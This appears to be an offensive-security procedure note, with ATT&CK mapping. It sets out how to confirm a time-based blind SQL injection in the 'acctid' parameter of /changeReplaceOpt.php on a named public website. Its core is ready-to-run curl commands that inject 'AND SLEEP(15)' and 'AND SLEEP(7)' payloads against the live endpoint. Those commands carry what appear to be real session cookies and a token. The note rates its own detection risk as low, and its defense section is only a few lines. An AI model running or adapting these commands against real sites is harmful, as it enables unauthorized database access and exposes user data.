---
id: proc-sqli-identify-change-001
tags:
  - sqli
  - blind-sqli
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sqli-sleep-15-change-replace-opt]]'
  - '[[commands/sqli-sleep-7-change-replace-opt]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.962Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify SQL Injection in changeReplaceOpt

## Summary

This procedure identifies the time-based blind SQL injection vulnerability in the 'acctid' parameter of the /changeReplaceOpt.php endpoint on intensedebate.com by testing for injectable points and confirming via timing delays.

## Description

The attack targets a PHP-based web application using MySQL, where user input in the GET parameter 'acctid' is not sanitized, allowing SQL payloads to alter query execution. By injecting MySQL's SLEEP() function, attackers observe response delays to infer successful injection without visible errors, enabling blind exploitation. This leads to potential database enumeration and user data exposure.

## Requirements

1. Access to a web browser or HTTP client like curl for sending requests
2. Knowledge of the target URL: https://www.intensedebate.com/changeReplaceOpt.php
3. Ability to measure response times accurately

## Defense

Defensive measures and detection strategies:

- Implement prepared statements or parameterized queries in PHP to sanitize inputs
- Use web application firewalls (WAF) to detect SQL keywords like SLEEP in requests
- Monitor server logs for unusual response times or query anomalies

## Objectives

1. Confirm the endpoint accepts unsanitized input
2. Establish baseline response time for comparison
3. Set foundation for blind exploitation

## Instructions

### Step 1: Send Baseline Request

**Context**: Establish normal response time by sending a legitimate request to the endpoint.

**Command** ([[commands/baseline-change-replace-opt]]):
```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
```

> This command sends a clean request; expect a quick response (under 1 second) to use as baseline.

### Step 2: Test for Injection with SLEEP Payloads

**Context**: Inject SLEEP to detect delays indicating SQL execution.

**Command** ([[commands/sqli-sleep-15-change-replace-opt]]):
```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(15)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
```

> Observe ~15-second delay; confirms vulnerability.

**Command** ([[commands/sqli-sleep-7-change-replace-opt]]):
```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(7)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
```

> ~7-second delay provides further confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqli-sleep-15-change-replace-opt]]
- [[commands/sqli-sleep-7-change-replace-opt]]

## Tools Used


## Tags

- sqli
- blind-sqli
